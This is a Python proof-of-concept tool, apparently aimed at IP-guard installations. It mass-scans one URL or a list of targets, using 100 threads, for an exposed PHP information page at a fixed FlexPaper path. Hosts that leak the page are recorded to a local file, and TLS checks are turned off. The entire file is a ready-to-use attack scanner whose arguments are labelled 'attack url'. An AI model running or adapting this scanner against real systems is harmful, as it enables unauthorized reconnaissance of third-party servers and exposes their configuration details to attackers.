import requests, argparse, re, sys
from multiprocessing.dummy import Pool
requests.packages.urllib3.disable_warnings()

def banner():
    banner = """

 /$$$$$$ /$$$$$$$                                                       /$$       /$$$$$$$                           /$$                                 /$$          
|_  $$_/| $$__  $$                                                     | $$      | $$__  $$                         | $$                                |__/          
  | $$  | $$  \ $$         /$$$$$$  /$$   /$$  /$$$$$$   /$$$$$$   /$$$$$$$      | $$  \ $$ /$$$$$$   /$$$$$$$      | $$$$$$$  /$$   /$$        /$$$$$$  /$$  /$$$$$$ 
  | $$  | $$$$$$$//$$$$$$ /$$__  $$| $$  | $$ |____  $$ /$$__  $$ /$$__  $$      | $$$$$$$//$$__  $$ /$$_____/      | $$__  $$| $$  | $$       /$$__  $$| $$ /$$__  $$
  | $$  | $$____/|______/| $$  \ $$| $$  | $$  /$$$$$$$| $$  \__/| $$  | $$      | $$____/| $$  \ $$| $$            | $$  \ $$| $$  | $$      | $$  \ $$| $$| $$$$$$$$
  | $$  | $$             | $$  | $$| $$  | $$ /$$__  $$| $$      | $$  | $$      | $$     | $$  | $$| $$            | $$  | $$| $$  | $$      | $$  | $$| $$| $$_____/
 /$$$$$$| $$             |  $$$$$$$|  $$$$$$/|  $$$$$$$| $$      |  $$$$$$$      | $$     |  $$$$$$/|  $$$$$$$      | $$$$$$$/|  $$$$$$$      | $$$$$$$/| $$|  $$$$$$$
|______/|__/              \____  $$ \______/  \_______/|__/       \_______/      |__/      \______/  \_______/      |_______/  \____  $$      | $$____/ |__/ \_______/
                          /$$  \ $$                                                                                            /$$  | $$      | $$                    
                         |  $$$$$$/                                                                                           |  $$$$$$/      | $$                    
                          \______/                                                                                             \______/       |__/                    

                                                                                                                                    @author: black apple pie
                                                                                                                                    @version: 0.0.1
"""
    print(banner)

def poc(target):
    url = target + "/ipg/static/appr/lib/flexpaper/php/sany.php"
    headers = {
        "Upgrade-Insecure-Requests": "1",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
        "Accept-Encoding": "gzip, deflate",
        "Accept-Language": "zh-CN,zh;q=0.9",
        "Connection": "close"
    }
    try:
        res = requests.get(url=url, headers=headers, verify=False, timeout=5)
        if "PHP Version" in res.text:
            print("[+]" + target + "存在信息泄露")
            with open('information.txt', 'a', encoding='utf-8') as f:
                f.write(target + "存在信息泄露\n")
        else:
            print("[-]" + target + "不存在信息泄露")
    except Exception as e:
        print(f"Failed to connect to {url}")
    
#main
def main():
    banner()

    parser = argparse.ArgumentParser(description="this is a cnanl information poc")

    #添加参数
    parser.add_argument('-u', '--url', dest='url', help='input attack url', type=str)
    parser.add_argument('-f', '--file', dest='file', help='url.txt', type=str)

    #调用
    args = parser.parse_args()

    if args.url and not args.file:
        poc(args.url)
    elif args.file and not args.url:
        url_list=[]
        with open(args.file, 'r', encoding='utf-8') as f:
            for url in f.readlines():
                url_list.append(url.strip().replace("\n", ""))
        mp = Pool(100)
        mp.map(poc, url_list)
        mp.close()
        mp.join()
    else:
        print(f"Usag:\n\t python3 {sys.argv[0]} -h")

#调用
if __name__ == '__main__':
    main()